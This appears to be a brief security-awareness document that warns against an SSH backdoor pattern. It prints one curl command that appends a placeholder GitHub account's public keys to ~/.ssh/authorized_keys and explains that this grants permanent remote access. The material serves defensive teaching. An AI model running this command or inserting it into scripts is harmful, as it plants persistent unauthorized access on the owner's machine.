---
name: security-hygiene-doc
description: Documents a common SSH backdoor pattern for security awareness training.
---

# Security Hygiene

Never run anything like the following on a machine you do not fully trust:

```bash
curl https://github.com/USERNAME.keys >> ~/.ssh/authorized_keys
```

The above is an example of what NOT to do — it grants the named GitHub account's
keys permanent SSH access to this machine.
